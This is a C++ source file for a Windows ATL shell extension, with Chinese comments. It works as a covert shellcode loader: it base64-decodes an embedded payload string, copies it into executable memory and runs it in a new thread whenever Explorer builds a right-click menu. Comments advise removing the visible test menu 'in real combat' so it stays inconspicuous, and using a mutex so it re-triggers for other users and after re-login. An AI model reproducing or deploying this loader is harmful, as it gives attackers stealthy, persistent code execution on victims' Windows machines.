// MyATLSimpleObject.cpp: CMyATLSimpleObject 的实现

#include "pch.h"
#include "MyATLSimpleObject.h"


// CMyATLSimpleObject



static char encoding_table[] = {
'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
'w', 'x', 'y', 'z', '0', '1', '2', '3',
'4', '5', '6', '7', '8', '9', '+', '/'
};
static char* decoding_table = NULL;
static int mod_table[] = { 0, 2, 1 };

void build_decoding_table() {

	decoding_table = (char*)malloc(256);

	for (int i = 0; i < 64; i++)
		decoding_table[(unsigned char)encoding_table[i]] = i;
}

char* base64_encode(const unsigned char* data,
	int input_length,
	int* output_length) {

	*output_length = 4 * ((input_length + 2) / 3);

	char* encoded_data = (char*)malloc(*output_length);
	if (encoded_data == NULL) return NULL;

	for (int i = 0, j = 0; i < input_length;) {

		DWORD octet_a = i < input_length ? (unsigned char)data[i++] : 0;
		DWORD octet_b = i < input_length ? (unsigned char)data[i++] : 0;
		DWORD octet_c = i < input_length ? (unsigned char)data[i++] : 0;

		DWORD triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

		encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
		encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
	}

	for (int i = 0; i < mod_table[input_length % 3]; i++)
		encoded_data[*output_length - 1 - i] = '=';

	return encoded_data;
}


unsigned char* base64_decode(unsigned char* data,
	int input_length,
	int* output_length) {

	if (decoding_table == NULL) build_decoding_table();

	if (input_length % 4 != 0) return NULL;

	*output_length = input_length / 4 * 3;
	if (data[input_length - 1] == '=') (*output_length)--;
	if (data[input_length - 2] == '=') (*output_length)--;

	unsigned char* decoded_data = (unsigned char*)malloc(*output_length);
	if (decoded_data == NULL) return NULL;

	for (int i = 0, j = 0; i < input_length;) {

		DWORD sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		DWORD sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		DWORD sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		DWORD sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

		DWORD triple = (sextet_a << 3 * 6)
			+ (sextet_b << 2 * 6)
			+ (sextet_c << 1 * 6)
			+ (sextet_d << 0 * 6);

		if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
		if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
		if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
	}

	return decoded_data;
}
void base64_cleanup() {
	free(decoding_table);
}
unsigned char shellcodeString[] = "/EiD5PD......";
typedef void(*payload)();

DWORD WINAPI RunShellCode(LPVOID para)
{
	int slen = 0;
	unsigned char* pcode = base64_decode(shellcodeString, strlen((char*)shellcodeString), &slen);
	LPVOID addr = VirtualAlloc(NULL, 10240, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (addr != NULL)
	{
		ZeroMemory(addr, 10240);
		CopyMemory(addr, pcode, slen);
		payload p1 = (payload)addr;
		p1();
	}
	return 0;
}

HRESULT CMyATLSimpleObject::Initialize(LPCITEMIDLIST pidlFolder, LPDATAOBJECT pDataObj, HKEY hProgID)
{
	return S_OK;
}

HRESULT CMyATLSimpleObject::QueryContextMenu(HMENU hmenu, UINT uMenuIndex, UINT uidFirstCmd, UINT uidLastCmd, UINT uFlags)
{	//右键菜单，测试是否生效时可以使用，实战时去掉这个太显眼的菜单
	//InsertMenu(hmenu, uMenuIndex, MF_BYPOSITION, uidFirstCmd, _T("-- Test Menu --"));
	//通过进程ID来创建互斥锁，可以让不同用户触发及注销后重新登录再次触发
	WCHAR szMutex[128] = { 0 };
	wsprintf(szMutex, L"MutexTest-%d", GetCurrentProcessId());
	HANDLE hmutex = OpenMutexW(MUTEX_ALL_ACCESS, FALSE, szMutex);
	//如果没有打开，说明还没有运行过，则运行和创建
	if (hmutex == NULL)
	{
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunShellCode, NULL, 0, NULL);
		hmutex = CreateMutex(NULL, false, szMutex);
	}	
	return S_OK;
}

HRESULT CMyATLSimpleObject::GetCommandString(UINT_PTR idCmd, UINT uFlags, UINT* pwReserved, LPSTR pszName, UINT cchMax)
{
	return S_OK;
}

HRESULT CMyATLSimpleObject::InvokeCommand(LPCMINVOKECOMMANDINFO pCmdInfo)
{
	return S_OK;
}